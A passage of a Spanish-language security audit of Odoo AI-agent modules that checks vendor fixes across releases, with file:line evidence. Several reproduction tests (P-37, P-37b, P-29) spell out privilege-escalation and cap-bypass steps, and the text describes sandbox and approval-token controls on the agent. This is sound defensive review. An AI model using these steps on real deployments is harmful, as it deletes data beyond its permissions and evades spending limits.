  volver a la vista gráfico y cambiar de tipo; también el tablero de Contabilidad. Esperado si está
  bien: gráficos de Odoo correctos y sin errores en la consola.

#### PNS-50 y PNS-77 (Baja) — PARCIAL: Chatboo sigue sin tests en el paquete

- `pns_ai_mcp`: los tres tests se importan y llevan `standard` (fila). La ruta que cita
  (`common/tests/__init__.py`) no existe en el paquete; es `pns_ai_mcp/tests/__init__.py`.
- Chatboo: los negativos de aislamiento y saneado «están en `unit_tests/`», que no se entregan. En
  Odoo 14 no hay ningún test de Chatboo en 3.1.879. Nuestros tests de E2
  (`pns_ai_chatboo/tests/test_seges_chatboo_access.py` (rama)) son hoy los únicos (§4.1).

#### Notas sobre VERIFICADO con salvedad

- **PNS-32:** el sello se relee bajo el lock, pero `maybe_sync_factory_knowledge` corre en
  `_register_hook` (`models/ai_context.py:414-417`), dentro de la transacción de carga del registro, en
  REPEATABLE READ: un worker cuya transacción empezó antes de que otro confirmara el sello lo verá viejo
  y volverá a sembrar (idempotente; el choque en filas ya tocadas lo tapa el `savepoint` de
  `ai_context_disk.py:135-142`). REQUIERE PRUEBA con dos workers (su check), mirando el log.
- **PNS-42:** ver §5.7 (PB-2).
- **PNS-95:** el redondeo y los separadores del servidor son correctos; el texto libre del modelo no
  pasa por `_fmt_number`.

### 5.7 Efecto en D9, PB-1 y PB-2

Estado de partida (pns_ai_decisiones.md, «Bloqueantes vigentes»): **D9 y PB-2** siguen bloqueantes
siempre; **PB-1** CERRADA desde 3.1.782. Este apartado no decide: dice qué cambia para cada una.

| Decisión | Qué la motivaba («Tras 3.1.782») | Qué cambia con 3.1.879 (archivo:línea) | Qué no cambia o es nuevo | Efecto en la decisión |
|---|---|---|---|---|
| **D9** (parches globales de `pns_ai_mcp`) | PNS-31 sin cambios; `include` de JS de 11 a 19, uno sobre `WebClient` que arranca el sondeo del bus para todo usuario | `_process_ondelete` solo para modelos `pns*` (`pns_ai_mcp/models/ir_model_fields_selection.py:23-60`); el `WebClient.include` y el sondeo del bus solo se instalan para AI Administrator (`static/src/js/key_pin_desk_v14.js:525-550`); `set_values` ya no reescribe la política (`models/res_config_settings.py:334-342`); el filtro de origen solo actúa en su formulario (`ai_agent_origin_filter_v14.js:367-401`) | `Root.get_request` sigue parcheado para todo el proceso (todas las BD), acotado a POST JSON a `/mcp*` (`http_patch.py:18-39`), como en 3.1.782. `.include(` en `pns_ai_mcp`: 20 en 3.1.782 y 22 en 3.1.879 (Grep): nuevos `FormRenderer.include` (`ai_agent_origin_filter_v14.js:385`) y `ListRenderer.include` (`mcp_log_tree_v14.js:18`), ambos sin efecto fuera de sus vistas. Chatboo (D43): `ActionManager.include` (`pns_ai_chatboo/static/src/js/chatboo_systray.js:550`) y unos 20 JS propios en el backend | **Se reduce el alcance**: de los parches que tocaban a todos, quedan `Root.get_request` (sin cambios) y `include` de JS que son no-op fuera de las pantallas PNS. Sigue siendo una decisión de aceptación, ahora con un riesgo menor. Lo nuevo que pesa está en Chatboo: Chart.js 4.4.8 en `window.Chart` (PNS-70, P-70) |
| **PB-1** (web y descripción de todos los módulos) | CERRADA (PNS-41 corregido) | Sin cambios: el campo calculado solo apunta al índice local si el manifiesto del módulo lo pide (`pns_base/models/ir_module_module.py:21-33`); el marco sigue con `sandbox` sin `allow-scripts` (`pns_base/static/src/js/pns_module_index.js:27`) | — | Sigue CERRADA. Queda su comprobación en el VPS (`website` de un módulo OCA) |
| **PB-2** (validación global de formularios y listas) | `BasicController.include` sustituye `_notifyInvalidFields` en todos los formularios y listas; CSS de obligatorios global | CSS y aviso solo en vistas con `o_pns_view` (`pns_base/static/src/css/pns_required_readonly.css:4-6`; `pns_invalid_fields_dedupe.js:78-110`); fuera de ellas se llama a `_super` sin tocar los argumentos (`:100-103`) | Sigue el `BasicController.include` (global, delega). **Nuevo:** `fields_view_get` sobre `base` para todos los modelos (`pns_base/models/ir_ui_view_patch.py:503-514`): cada carga de vista lee el XML ID de la vista principal y, si es `pns*`, reescribe el `arch`. También `_alias_groups_vals` en `_load_records`/`create`/`write` de vistas, menús y acciones de cualquier módulo (`:297-299, 313-352, 435-500`), sin efecto en 14 salvo que alguien use `group_ids` | **El cambio visible desaparece** fuera de las vistas PNS, y la comprobación de los `web_*` de OCA pierde casi todo su peso (el `include` delega). Queda un parche global nuevo y menor en el servidor (`fields_view_get`). REQUIERE PRUEBA: su check (formulario estándar con obligatorio vacío) y una vista con un módulo `web_*` de OCA del cliente |

Relacionadas, sin bloquear: **PB-7** (PNS-43) pasa a afectar solo a traducciones `pns*`
(`pns_base/models/ir_translation.py:88-111`); **D43** (PNS-72/70) mejora en peso, pero el choque de
Chart.js cambia de sentido (PNS-70).

**Recuento §5 (24 fichas):**

| Estado | N.º | Fichas |
|---|---|---|
| VERIFICADO | 18 | PNS-93, 87, obs. 5, 68, 76, 24, 32, 42, 43, 31 + obs. 4, 72, 39, 40, 29 (parte), 95/46, 49/74/obs. 12, 73, 38 |
| PARCIAL | 5 | PNS-81, 88, 26 (Alta), 70, 50/77 |
| NO CORREGIDO | 0 | — |
| REQUIERE PRUEBA (como estado principal) | 1 | PNS-94 |

## 6. Features planificadas

Todas las fichas vienen como «Resuelto». Columna «Hallazgo»: lo que pedía nuestro informe o la decisión
que lo recoge. «Superficie nueva»: lo que la feature añade y no estaba en 3.1.782. El estado mide si la
feature cubre el hallazgo sin dejar un resto concreto.

| Ficha | Fabricante | Hallazgo (nuestro) | Qué cubre en 3.1.879 (archivo:línea) | Superficie nueva (archivo:línea) | Resultado | Checks para Seges / reproducible |
|---|---|---|---|---|---|---|
| PNS-29 (parte) — tope de gasto | 3.1.851 | Sin tope de gasto, tokens ni turnos (D12: «el tope se pone en la cuenta del proveedor») | Tope mensual por proveedor en USD o tokens (`pns_ai_mcp/models/ai_provider.py:363-377`), comprobado antes de cada inferencia (`:592, 1049-1065`; `utils/agent_engine.py:117`; `utils/engine_turn_messages.py:87`) y al formar la cadena (`models/ai_execution_engine.py:252-276, 318-321`); asistente «Este mes» (`wizard/ai_provider_usage_wizard.py:39-40`) | `month_usage()` público, lee `ai.log` en `sudo` (`ai_provider.py:1016-1047`); cualquier interno lee `ai.provider` (`security/ir.model.access.csv:10`). El consumo sale de `ai.log`, que se puede borrar o purgar (detalle) | **PARCIAL** | Su check: sí. Añadir los casos del detalle (P-29) |
| PNS-18 — datos hacia el proveedor | ya estaba / `6f414636` | Envío sin filtro y respaldo externo (D10, aceptada el 19/10; opción 2 «solo local» para otros clientes) | Casilla `no_external_failover` (`ai_provider.py:379-384`) que corta la cadena tras ese proveedor (`ai_execution_engine.py:305-316`); fusible de 50 000 filas / 2 MB (`controllers/relaxaicode_replies.py:21-22, 47-72`) | — (sin código nuevo). **Resto:** la cuota y la casilla de rol se filtran antes que `no_external_failover`, y un rol sin cubrir usa todos los activos (detalle) | **PARCIAL** | Su check (local con la casilla no salta): sí, solo con texto. Añadir P-18 |
| PNS-20 (parte) — revisar antes de importar | `pns_base` 1.2.38 / `pns_ai_mcp` 3.1.854 | La importación sobrescribía sin aviso (PNS-20) | Botón Revisar: `action_preview` del asistente común (`pns_base/models/operation_report_wizard.py:305-323`); la copia completa de IA usa `dry_run` (`pns_ai_mcp/wizard/config_backup_wizard.py:108-114`) | La vista previa **ejecuta la importación real** dentro de un `SAVEPOINT` en SQL directo y la deshace (`operation_report_wizard.py:290-291, 310-322`) | **REQUIERE PRUEBA** | Su check: sí, y además P-20 (detalle) |
| PNS-37 (parte) — reversión del diario | 3.1.853 | El diario no permitía deshacer | `unlink` de un plan sobre modelos con `active` archiva (`pns_ai_mcp/controllers/safe_plan.py:938-961`; `models/ai_change_journal.py:200-206, 278-283`); revertir, vaciar uno o todos (`:443-539, 551-610`) con `_ensure_journal_manager` (`:38-45`); filas no borrables (`:635-638`); cron diario (`:612-633`; `data/journal_trash_cron.xml:5-15`) | **El cron vacía como superusuario lo que digan filas editables por AI Administrator** (`security/ir.model.access.csv:42-43`, `1,1,1,0`); el «borrado» del plan archiva con permiso de escritura, sin comprobar el de borrado, y el cron borra después como superusuario (`controllers/safe_plan.py:938-953`); públicos `snapshot_records`, `record_executed_step`, `model_can_archive` (`ai_change_journal.py:200-372`) | **PARCIAL** (resto de gravedad Alta, detalle) | Su check: sí. Añadir P-37 |
| PNS-64 (resto) — voces remotas | `pns_ai_chatboo` 2.1.521 | Lectura en voz alta con voces del fabricante del navegador (D41) | Sin la casilla solo voces locales y, si no hay, no se lee (`pns_ai_chatboo/static/src/js/chatboo_tts.js:60-120, 345-348`); casilla en Ajustes (`models/res_config_settings.py:96`) y en `session_info` (`models/ir_http.py:24-29`) | La casilla también se cambia desde el agente de Chatboo, como AI Administrator sin Ajustes (`models/ai_agent.py:56-63, 132-137` → `utils/chatboo_product_icp.py:215-219`, en `sudo`); igual que los otros parámetros de Chatboo desde 3.1.782 | **VERIFICADO** | Sí, en el navegador (con y sin voz local) |
| Petición de §5 — prompt en `ai.log` | 3.1.856 | Poder auditar lo que recibe el modelo (seguimiento, PNS-95: «`prompt_data` no guarda el prompt de los turnos de Chatboo») | Columna «User Prompt» en las listas (`pns_ai_mcp/views/ai_log_views.xml:35, 84`), con el texto de quien pregunta recortado a 480 (`utils/engine_discovery.py:325, 506`) | — | **PARCIAL** | Su check: sí. Lo que pedíamos (lo que recibe el modelo: system, historial, bundle) sigue sin guardarse («No se copia el system al log»). La prueba P-61 de §4 no puede apoyarse en `prompt_data` |
| PNS-96 — modelos `lite` | 3.1.858 | Ids inventados en los enlaces (PNS-96) | Enlace a `/web#id=` en la prosa solo si la herramienta devolvió ese modelo e id (`pns_ai_mcp/utils/record_linkify.py:76-131`) | — | **VERIFICADO** | Sí (prueba 4a del staging del 16/10) |
| Obs. 1 — `system_prompt` duplicado | 3.1.857 | Dos entradas en `prompts/list` | `get_listable_for_mcp` salta `system_prompt` (`pns_ai_mcp/models/ai_context_composition.py:169-193`) | — | **VERIFICADO** | Sí (`prompts/list` por `/mcp`) |
| Obs. 9 — agente sin cadena | 3.1.857 | Qué proveedores usa un agente sin cadena | Sin cadena, todos los activos por id (`models/ai_execution_engine.py:228-251`); rol no cubierto, los activos con la casilla (`:257-263`); especialistas primero (`:279-303`) | — (la regla ya estaba) | **VERIFICADO** | Sí. Ver PNS-18: el orden por id puede poner un externo delante de un local |
| Obs. 10 — tipos de cambio al abrir Chatboo | 3.1.857 | Salida a Internet no anunciada (D14) | Ayuda del campo y de la vista (`pns_ai_mcp/models/ai_fx_source.py:35`; `views/ai_fx_source_views.xml:54`) | — (ya en 3.1.782, `ai_fx_source.py:78-86`). `get_usd_fx` es público para todo interno (`ai_fx_source.py:87-166`; `security/ir.model.access.csv:12`) y descarga con `urllib` sin comprobar que el host sea público ni limitar tamaño o redirecciones (`:73-80`); la URL la fija un AI Administrator (`:49-56`; ACL `:54`) | **VERIFICADO** (lo que dice la ficha) | Sí (ayuda en Ajustes). La salida sin control de host queda para §8 |
| Obs. 11 — skill retirada borrada en cada `-u` | `pns_ai_chatboo` 2.1.522 | Borrado por nombre en cada actualización | La semilla solo llama a `import_from_module` (`pns_ai_chatboo/data/chatboo_skill_data.xml:10`), que retira filas de fábrica sin fichero y respeta el dueño (`pns_ai_mcp/models/ai_skill.py:2220-2250, 2299-2318`) | `import_from_module` es público: exige AI Administrator (`ai_skill.py:2306`) y retira en `sudo` (`:2315`); por RPC, un AI Administrator puede forzar la resiembra (pisa ediciones de fábrica, D38) | **VERIFICADO** | Sí (`-u` de Chatboo) |

### 6.1 Detalle de PARCIAL y REQUIERE PRUEBA

#### PNS-29 (parte) — PARCIAL: el tope depende de `ai.log`

- **Lo que cubre:** ver la fila. Comprobación antes de cada llamada; los turnos en paralelo pueden pasar
  el tope (por diseño: «no se corta a mitad»).
- **Restos:**
  1. El consumo del mes se calcula sumando `ai.log` (`ai_provider.py:1026-1034`). Un AI Administrator
     puede borrar filas (`security/ir.model.access.csv:41`, `unlink`; `_delete_oldest_logs` en `sudo`,
     `models/ai_log.py:862-902`) y una retención menor que el mes (`_cron_purge_old_logs`,
     `ai_log.py:904-929`; N1) también: la clave vuelve a tener cuota.
  2. La cuota se filtra **antes** que `no_external_failover` (`ai_execution_engine.py:252-254`): si el
     proveedor local con la casilla agota su tope, la cadena sigue con los externos de detrás (PNS-18).
  3. `month_usage()` es público y lee en `sudo`: cualquier interno (también por RPC) obtiene tokens y
     coste del mes de cada proveedor (`ai_provider.py:1016-1047`; ACL de lectura de `ai.provider` para
     `base.group_user`, `security/ir.model.access.csv:10`). Información, gravedad Baja.
- **P-29:** (a) tope de tokens bajo en un proveedor; gastar hasta el tope; como AI Administrator borrar
  los logs del mes; el turno siguiente sale (hoy se espera que sí). (b) Interno sin grupos de IA:
  `call_kw` a `ai.provider.month_usage` sobre un proveedor: se espera `AccessError` si está corregido.

#### PNS-18 — PARCIAL: «Sin failover externo» no corta en todos los caminos

- `_without_external_after_local` (`ai_execution_engine.py:305-316`) corta la cadena **después** del
  proveedor con la casilla, pero solo si ese proveedor sigue en la cadena. Antes se aplican dos
  filtros: la casilla de rol (`_fits(need)`, `:252`) y la cuota (`_without_capped`, `:253`). Además:
  - si la cadena del agente no tiene a nadie para un rol (imagen, audio, decisión, diseño…), se usan
    **todos** los proveedores activos con esa casilla, por id, sin mirar la cadena (`:257-263`);
  - un agente sin cadena usa todos los activos por id (`:232-235`; obs. 9): un externo con id menor
    va delante del local.
- **Efecto:** con un local marcado y externos activos, un turno con imagen (si el local no tiene la
  casilla de visión) o con el local sin cuota va a un externo. Para Seges (D10 ACEPTADA) no cambia
  nada; para un cliente que elija la opción 2 de D10, la garantía exige que no haya externos
  **activos**, no basta la casilla.
- **P-18:** dos proveedores activos, local (con «No external failover», sin casilla de visión) y
  externo; agente con cadena = solo el local. Turno con imagen: mirar en `ai.log` el `provider_id` de
  la fila de inferencia. Esperado si cumple la ficha: ninguna fila con el externo.

#### PNS-20 (parte) — REQUIERE PRUEBA: la vista previa ejecuta la importación

- `action_preview` (`pns_base/models/operation_report_wizard.py:305-323`) llama a la importación real
  (`action_import`) dentro de `SAVEPOINT` en SQL directo, lee los contadores y hace `ROLLBACK TO
  SAVEPOINT` e `invalidate_cache()` (`:290-291, 310-322`).
- En Odoo 14 las escrituras del ORM sobre registros existentes quedan en `towrite` hasta el siguiente
  flush; ni el `SAVEPOINT` en SQL directo vuelca antes, ni `invalidate_cache()` vacía `towrite`
  (`odoo/models.py:5773-5782`; compárese con `cr.savepoint()`, `odoo/sql_db.py:113-134`). Las
  sobrescrituras no volcadas durante la vista previa podrían escribirse al final de la petición
  («Revisar» aplicaría parte de la importación). Lo que la importación confirme en cursores propios o
  envíe fuera tampoco se deshace. La copia completa de IA (`dry_run`) no tiene este problema.
- Otros asistentes siguen con `replace_existing` por defecto `True` (§2.1, PNS-20).
- **P-20:** AI Administrator; importar un JSON de usuarios MCP (y otro de proveedores) con
  «Sobrescribir» marcado que cambie un campo de un registro existente; pulsar Revisar y cerrar sin
  Confirmar; `SELECT` de ese campo. Esperado: sin cambios.

#### PNS-37 (parte) — PARCIAL: la papelera abre una vía de borrado como superusuario

- **Lo que cubre:** ver la fila. Revertir y vaciar a mano actúan con los permisos de quien pulsa
  (`ai_change_journal.py:463-489, 593-597`): sin escalada por esa vía.
- **Superficie nueva (gravedad propuesta: Alta, requiere AI Administrator):**
  - El cron `_cron_empty_journal_trash` (`:612-633`) se crea sin `user_id`
    (`data/journal_trash_cron.xml:5-15`), así que corre con el usuario que instaló el módulo
    (superusuario). Borra con `unlink()` los ids que diga `after_json` de cada fila «en papelera»
    (`op='unlink'`, `state='applied'`, `reversible`, sin `reverts_id`, `meta.quarantine`;
    `:541-575`), en el modelo que diga `model_name`, si la fila tiene más de N días (30 por defecto).
  - Las filas del diario son editables por AI Administrator y por Ajustes
    (`security/ir.model.access.csv:42-43`, `1,1,1,0`); el modelo solo sobrescribe `unlink`
    (`:635-638`). Un AI Administrator sin Ajustes puede reescribir una fila antigua y el cron borrará
    como superusuario registros de cualquier modelo, también los que él no puede borrar. Mismo patrón
    que PNS-97 (un registro editable que el código trata como fiable).
  - Sin forjar nada: el paso `unlink` de un plan, sobre un modelo con `active`, hace
    `recs.write({'active': False})` (`controllers/safe_plan.py:938-953`), es decir, exige permiso de
    **escritura**, no de borrado (no hay `check_access_rights('unlink')` ni `check_access_rule` de
    borrado antes). Pasados los días de la papelera, el cron borra esos registros como superusuario,
    saltando las reglas de borrado de Odoo. Afecta a cualquier usuario que pueda confirmar un plan de
    escritura (AI Writer) sobre un modelo archivable en el que tenga escritura y no borrado. Las
    sobrescrituras de `unlink` que lanzan error siguen aplicándose (el superusuario también las pasa).
  - Públicos nuevos `snapshot_records`, `record_executed_step` y `model_can_archive`
    (`:200-372`): por RPC, `record_executed_step` crea con `create` normal (sin ACL de diario no puede);
    se anotan para §8.
- **P-37:** `create_date` no se puede escribir, así que hace falta una fila del diario que ya tenga
  más días que la retención (o bajar `pns_ai_mcp.journal_trash_days` a 1 como administrador y esperar un
  día). AI Administrator sin Ajustes, por `call_kw`: `write` sobre esa fila con `op='unlink'`, `state='applied'`, `reversible=True`, `reverts_id=False`,
  `model_name='res.partner'` y `after_json` = `{"ids": [<contacto sin dependencias>], "meta":
  {"quarantine": true}}`; ejecutar el cron «AI: empty change trash older than retention». Esperado si
  está corregido: el `write` se rechaza. Hoy se espera que el contacto desaparezca.
- **P-37b:** usuario AI Writer con escritura y sin borrado en un modelo con `active` (comprobar en
  Ajustes → Técnico → Permisos de acceso cuál; p. ej. un grupo propio de prueba sobre `res.partner`):
  plan «borra el contacto X», confirmado. Esperado si está corregido: rechazo por falta de permiso de
  borrado. Hoy se espera que se archive; con `pns_ai_mcp.journal_trash_days` a 1 (como administrador) y
  el cron ejecutado al día siguiente, que desaparezca.

#### Petición de §5 — PARCIAL: el prompt que recibe el modelo sigue sin guardarse

- Lo pedido (seguimiento, PNS-95, staging del 16/10: «Lo que recibe el modelo no se puede ver») era
  poder auditar lo enviado. La columna nueva enseña lo que escribió el usuario (recortado a 480,
  `utils/engine_discovery.py:325, 506`), que ya estaba en el formulario. El system, el historial y el
  bundle no se guardan. Afecta a pruebas como P-61 (historial inventado) de §4, que necesitan ver lo
  que llegó al modelo.

**Recuento §6 (11 fichas):**

| Estado | N.º | Fichas |
|---|---|---|
| VERIFICADO | 6 | PNS-64, PNS-96, obs. 1, obs. 9, obs. 10, obs. 11 |
| PARCIAL | 4 | PNS-29 (parte), PNS-18, PNS-37 (parte; resto Alta), petición de §5 |
| NO CORREGIDO | 0 | — |
| REQUIERE PRUEBA (como estado principal) | 1 | PNS-20 (parte) |

## 7. No se hará, por diseño

En este apartado el estado se aplica a la **«defensa que sí existe»** que alega el fabricante:
VERIFICADO (existe tal como la describe), PARCIAL (existe con un hueco concreto), NO CORREGIDO (no
existe tal como la describe). La columna (b) valora el argumento y el riesgo que deja, sin decidir.

| Ficha | Defensa alegada | 3.1.879 (archivo:línea) | (a) Estado de la defensa | (b) Argumento y riesgo que queda |
|---|---|---|---|---|
| PNS-18 (parte) — lista de modelos o campos que nunca van al LLM | La IA lee como quien pregunta; «Sin failover externo»; fusible de 50 000 filas / 2 MB; el permiso fino es de ACL | El sandbox corre como el usuario y bloquea `sudo`, `with_user`, `env` (`pns_ai_mcp/controllers/validators_base.py:257-264`); fusible (`controllers/relaxaicode_replies.py:21-22, 47-72`); la casilla no corta en todos los caminos (`models/ai_execution_engine.py:252-263, 305-316`) | **PARCIAL** | Argumento razonable (una lista de campos se queda corta y no sustituye a las ACL). Riesgo: la casilla no garantiza «solo local» (§6.1, PNS-18). Para Seges, aceptado con D10; para otros clientes con la opción 2, la mitigación sería no tener proveedores externos activos |
| PNS-23 — que las skills nazcan inactivas | Ejecución de prueba en un `savepoint` que se revierte; el código que escribe se rechaza; la skill no tiene más permisos que quien la lanza; grupos por skill (PNS-66) | Rechazo por AST (`pns_ai_mcp/models/ai_skill.py:453-455`); ejecución de prueba en `cr.savepoint()` revertido (`:464-525`); `required_group_ids` y `user_may_run` (`:933-939`); las skills capturadas tienen dueño y solo las ve él (`filter_visible_for_user`, `:851-852`) | **VERIFICADO** | Razonable para lo capturado desde el chat (solo lo ve su autor). Riesgo que queda: (1) un paquete o copia importado sin dueño entra activo para todos y corre con los permisos de quien lo lanza (revisar paquetes antes de importarlos); (2) el contexto `skill_skip_body_check` salta la ejecución de prueba (`:464-467`; el AST sigue); (3) la ejecución de prueba puede llamar a métodos públicos con cursor propio y commit, cuyo efecto no deshace el `savepoint` (resto de PNS-07, §3, P-07) |
| PNS-36 (parte) — ocultar `fields_get` en el sandbox | Odoo ya enseña los campos a cualquier interno; los valores siguen protegidos; el nombre de la BD deja de precargarse | `fields_get` del core no exige lectura y filtra `groups` (`odoo/models.py:2882-2912`); sin `dbname` precargado (`controllers/context_builder.py:452-461`) | **VERIFICADO** | Razonable: es el comportamiento del core. Salvedad: el nombre de la BD sigue saliendo con `.format` (§3, PNS-36, P-36). Riesgo a aceptar o no en D22 (nombres de campo sin valores) |
| PNS-54 (parte) — PIN o reautenticación para aprobar | La tarjeta solo actúa para el dueño; los métodos de confirmación ya no son públicos; `confirm`/`execute` exigen el token de un solo uso que el modelo no ve | Frente al modelo: el sandbox bloquea por nombre los métodos de confirmación (`controllers/validators_base.py:233-255`) y las rutas exigen token (`controllers/verification_ui.py:37-97`). Pero `action_confirm_and_execute` y `action_execute_plan` siguen públicos y sin token (`models/safe_operation.py:1765-1831`), y el token se obtiene por RPC (`:2003-2048`; `verification_ui.py:142-146`) | **PARCIAL** | El argumento contra el PIN es razonable frente al modelo (un secreto que el modelo puede leer no sirve). No cubre la amenaza original de PNS-54, un script en la página (§3, PNS-54; P-54a y P-54b). Riesgo que queda: el residual del saneador (D26 y D29) |
| PNS-02 (parte) — acciones de vista y obligatoriedad con `group_ai_admin` | «Las acciones de grupos sí pasan a exigir `base.group_system`» | Ninguna exige `base.group_system`: se prohíbe la cúspide a todos (`models/ai_system_action.py:700-775`; §2.1, PNS-01/02). Las acciones de vista exigen `group_ai_admin` (`data/trusted_actions_system.xml:7-64`) | **NO CORREGIDO** (la defensa no existe tal como se describe) | Sobre las acciones de vista coincidimos (decisión de diseño aceptada). Sobre los grupos, el criterio es otro: un AI Administrator sin Ajustes puede dar o quitar cualquier grupo no cúspide (decisión N12; parche 12). Además, el AI Administrator puede editar el registro de acciones de confianza (PNS-97) |
| PNS-26 (parte) — quitar los `commit()` de la Caja B | Si la herramienta falla, `/mcp` y el motor deshacen lo no guardado; lo que el plan confirmó se queda; el cursor es REPEATABLE READ y el claim va en cursor propio | `/mcp`: `rollback` (`controllers/main.py:1357-1360`). Motor: `SAVEPOINT` en SQL directo, que en Odoo 14 no cubre escrituras diferidas (`utils/engine_tool_run.py:323-357`; §5.6, PNS-26). REPEATABLE READ (`odoo/sql_db.py:420`). Claim en cursor propio (`models/safe_operation.py:1201-1265`) | **PARCIAL** | Razonable: los `commit` de confirmar y ejecutar son la función (la petición siguiente tiene que ver el cambio). Riesgo que queda: los `commit()` sobre el cursor de la petición (`safe_operation.py:918, 927, 1325, 1424, 1468`) confirman también lo que haya pendiente en esa transacción |
| PNS-33 (parte) — HMAC con secreto del servidor | Clave de 32 caracteres aleatorios (~190 bits); solo viaja en cabecera; en la BD solo está el hash | Generación con `secrets.choice` sobre 62 símbolos (`models/mcp_user.py:425-431`); SHA-256 (`utils/api_key.py:35-48`); cabecera (§2.1, PNS-33). `docs/decisions/api_key_hashing.md` no viene en el paquete | **VERIFICADO** | Razonable para claves generadas. Riesgo que queda: `set_mcp_api_key` acepta una clave elegida por el administrador sin comprobar su fuerza, o un hash ya calculado (`mcp_user.py:444-461`; `utils/api_key.py:65-75`); para esas claves el hash sin sal permite un ataque de diccionario si se filtra la tabla o una exportación de usuarios (que lleva los hashes). Mitigación posible: usar solo claves generadas |

### 7.1 Detalle

#### PNS-18 (parte) — PARCIAL

- Ver §6.1, PNS-18 (caminos por los que un turno llega a un externo pese a la casilla) y P-18.

#### PNS-54 (parte) — PARCIAL

- Frente al modelo, la defensa existe: los nombres de los métodos de confirmación están en
  `RELAXAICODE_SIDE_EFFECT_METHODS` (`controllers/validators_base.py:233-255`) y el token solo sirve en
  una petición HTTP con la sesión del usuario. Frente a un script en la página (lo que pedía PNS-54) no:
  §3, PNS-54. La frase «los métodos de confirmación ya no son públicos» no es cierta para
  `action_confirm_and_execute` / `action_execute_plan`.

#### PNS-02 (parte) — NO CORREGIDO

- La ficha se apoya en una corrección que no es la que se ha hecho: 3.1.879 no pide `base.group_system`
  para dar o quitar grupos, prohíbe la cúspide a todos (§2.1, PNS-01/02; §2.2, parche 12). Lo que
  decide esta ficha (acciones de vista con `group_ai_admin`) sigue siendo aceptable con nuestro
  criterio; la diferencia en grupos es la de N12.

#### PNS-26 (parte) — PARCIAL

- Ver §5.6, PNS-26. El argumento de fondo (los `commit` de la Caja B son necesarios) se sostiene; la
  defensa alegada para el motor no hace lo que dice en Odoo 14.

**Recuento §7 (7 fichas, estado de la defensa alegada):**

| Estado | N.º | Fichas |
|---|---|---|
| VERIFICADO | 3 | PNS-23, PNS-36 (parte), PNS-33 (parte) |
| PARCIAL | 3 | PNS-18 (parte), PNS-54 (parte), PNS-26 (parte) |
| NO CORREGIDO | 1 | PNS-02 (parte) |
| REQUIERE PRUEBA (como estado principal) | 0 | — |

## 8. Cambios no anunciados y superficie nueva

**Método.** Comparación de `_fabricante/3.1.782/` con `_fabricante/3.1.879/`: Grep de `@http.route` en
los dos árboles; lista de métodos públicos (sin `_`) de cada modelo de `models/` en las dos versiones
y lectura de los nuevos o cambiados que usan `sudo()`, `registry.cursor()`, `SUPERUSER_ID` o
`commit()`; comparación línea a línea de `security/` (ACL, reglas y grupos) y de `data/`; lista de
`_name` / `_inherit` de los dos árboles. Los candidatos anotados en la pasada A y en la primera mitad
de esta se han analizado aquí; lo ya tratado en §3, §5, §6 o §7 se cita con remisión (§8.6) y no se
cuenta otra vez.

**Estados en esta sección** (sobre la superficie, no sobre una ficha): **VERIFICADO** (tiene los
controles que necesita y no se ve resto) · **PARCIAL** (control con un hueco concreto) · **NO
CORREGIDO** (sin control: hallazgo abierto; casi siempre con prueba de confirmación) · **REQUIERE
PRUEBA**. La gravedad es una **propuesta** con el criterio del informe. «Ya en 3.1.782» quiere decir
que el código existe igual en la base y, por tanto, también en nuestra rama (parches 1 a 12), salvo
que se diga otra cosa. Las llamadas por RPC se refieren a `/web/dataset/call_kw`: en Odoo 14
`_call_kw_multi` hace `browse(ids)` y llama al método sin comprobar acceso antes
(`/opt/odoo-src/14.0/odoo/odoo/api.py:386-392`), y el contexto lo pone quien llama (`:388`).

### 8.1 Rutas HTTP

Todas las rutas de los tres módulos (Grep de `http.route(` en los dos árboles). `pns_base` no tiene
rutas en ninguna de las dos versiones. En Odoo 14 una ruta `type='http'` con `POST` exige CSRF salvo
`csrf=False` (`odoo/http.py:779-780`).

| Ruta (3.1.879, archivo:línea) | Cambio frente a 3.1.782 | type · auth · csrf · cors | Qué comprueba | Resultado |
|---|---|---|---|---|
| `/chatboo/canvas/build` (`pns_ai_chatboo/controllers/chatboo.py:346-361`) | Nueva | json · user · — · — | Acceso a Chatboo (`_user_may_use_chatboo`, `:36-37`) y sesión propia (`_own_session`, `:88-95`). Crea el job en `sudo` y hace `commit` del cursor de la petición antes de lanzar el hilo (`models/chatboo_canvas_job.py:58-70`) | **VERIFICADO** (acceso). El contenido de la página: §8.4, F1 |
| `/chatboo/canvas/state`, `/chatboo/canvas/running`, `/chatboo/canvas/cancel` (`chatboo.py:363-402`) | Nuevas | json · user · — · — | Acceso a Chatboo; job propio por `user_id = uid` (`_own_canvas_job`, `:395-402`) o sesión propia; `request_cancel` vuelve a mirar el dueño (`models/chatboo_job.py:320-334`) | **VERIFICADO** |
| `GET /chatboo/canvas/<int:session_id>` (`chatboo.py:1133-1155`) | Nueva | http · user · — · — | Acceso a Chatboo y `session.user_id == uid`. Sirve en el origen de Odoo nuestra «carcasa» con el diseño dentro de un `iframe sandbox="allow-scripts allow-modals"` sin `allow-same-origin` (`models/chatboo_canvas.py:500-573`) | **VERIFICADO** (acceso). Sin CSP: §8.4, F1 |
| `GET /chatboo/share/people` (`chatboo.py:1164-1173`) | Nueva | http · user · — · — | Rechaza usuarios `share`; nombres de internos leídos con los permisos de quien llama (`models/chatboo_canvas_page.py:141-149`) | **VERIFICADO** |
| `POST /chatboo/canvas/<int:session_id>/share` (`chatboo.py:1175-1196`) | Nueva | http · user · CSRF (por defecto) · — | Acceso a Chatboo, sesión propia y diseño no vacío; crea `chatboo.canvas.page` con `owner_id = uid` y lectores internos (`people_named`, `chatboo_canvas_page.py:151-157`) | **VERIFICADO** |
| `POST /chatboo/page/<int:page_id>/people` (`chatboo.py:1198-1210`) | Nueva | http · user · CSRF (por defecto) · — | Página legible por las reglas y `owner_id == uid` | **VERIFICADO** |
| `GET /chatboo/page/<int:page_id>` (`chatboo.py:1220-1244`) | Nueva | http · user · — · — | Lectura por regla (dueño o lector nombrado, o AI Administrator: `security/security.xml:43-76`); misma carcasa con `sandbox` | **VERIFICADO** (acceso). Contenido: §8.4, F1; regla de AI Administrator: §8.3, D1 |
| `GET /chatboo/page/<id>/download` y `GET /chatboo/canvas/<id>/download` (`chatboo.py:1246-1295`) | Nuevas | http · user · — · — | Las mismas comprobaciones que la vista; `Content-Disposition: attachment` (`content_disposition`, `odoo/http.py:1688-1692`) y `nosniff`. El HTML no se interpreta en el origen de Odoo | **VERIFICADO**. Nota: el fichero descargado se ejecuta **sin** `sandbox` si se abre en local (F1) |
